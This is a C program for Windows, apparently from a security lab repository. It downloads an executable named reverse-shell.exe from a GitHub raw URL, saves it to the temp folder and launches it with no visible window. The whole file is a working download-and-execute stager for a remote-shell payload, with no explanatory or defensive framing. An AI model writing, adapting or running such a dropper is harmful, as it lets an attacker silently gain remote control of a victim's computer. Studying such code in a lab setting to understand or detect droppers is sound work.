#include <stdio.h>
#include <windows.h>
#include <winhttp.h>
#include <shlwapi.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")

void closeHandles(HINTERNET hRequest, HINTERNET hConnect, HINTERNET hSession) {
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}


int main() {
    char tempLocation[MAX_PATH];
    GetTempPathA(MAX_PATH, tempLocation);
    strcat_s(tempLocation, "download.exe");
    if (PathFileExistsA(tempLocation)) {
        DeleteFileA(tempLocation);
    }
    wchar_t userAgent[] = L"Mozilla/5.0";
    HINTERNET hSession = WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("WinHttpOpen failed: %d\n", GetLastError());
		closeHandles(NULL, NULL, hSession);
        return 1;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"github.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        printf("WinHttpConnect failed: %d\n", GetLastError());
		closeHandles(NULL, hConnect, hSession);
        return 1;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
        L"/JerryyyTheDuck/VCS-Lab/raw/refs/heads/main/Windows-Programming/reverse-shell/reverse-shell/reverse-shell.exe",
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        printf("WinHttpOpenRequest failed: %d\n", GetLastError());
		closeHandles(hRequest, hConnect, hSession);
        return 1;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("WinHttpSendRequest failed: %d\n", GetLastError());
		closeHandles(hRequest, hConnect, hSession);
        return 1;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("WinHttpReceiveResponse failed: %d\n", GetLastError());
        closeHandles(hRequest, hConnect, hSession);
        return 1;
    }

    DWORD contentLength = 0;
    BYTE* buffer;
    FILE* f = NULL;

    do {
        if (!WinHttpQueryDataAvailable(hRequest, &contentLength)) {
            printf("WinHttpQueryDataAvailable failed: %d\n", GetLastError());
            closeHandles(hRequest, hConnect, hSession);
            return 1;
        }

        if(contentLength == 0) {
            printf("No data available to read\n");
            break;
		}

        buffer = (BYTE*)malloc(contentLength + 1);
        if (!buffer) {
            printf("Memory allocation failed\n");
            closeHandles(hRequest, hConnect, hSession);
            return 1;
        }
        ZeroMemory(buffer, contentLength + 1);
        DWORD bytesRead = 0;
        if (!WinHttpReadData(hRequest, buffer, contentLength, &bytesRead)) {
            printf("WinHttpReadData failed: %d\n", GetLastError());
            free(buffer);
            closeHandles(hRequest, hConnect, hSession);
            return 1;
        }

        fopen_s(&f,tempLocation, "ab");
        if (f) {
            fwrite(buffer, 1, bytesRead, f);
            fclose(f);
        }
        free(buffer);
    } while (contentLength > 0);

    printf("[+] Downloaded in %s", tempLocation);
    


    closeHandles(hRequest, hConnect, hSession);

    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    wchar_t sus[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, tempLocation, -1, sus, MAX_PATH);
    CreateProcess(sus, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    return 0;
}
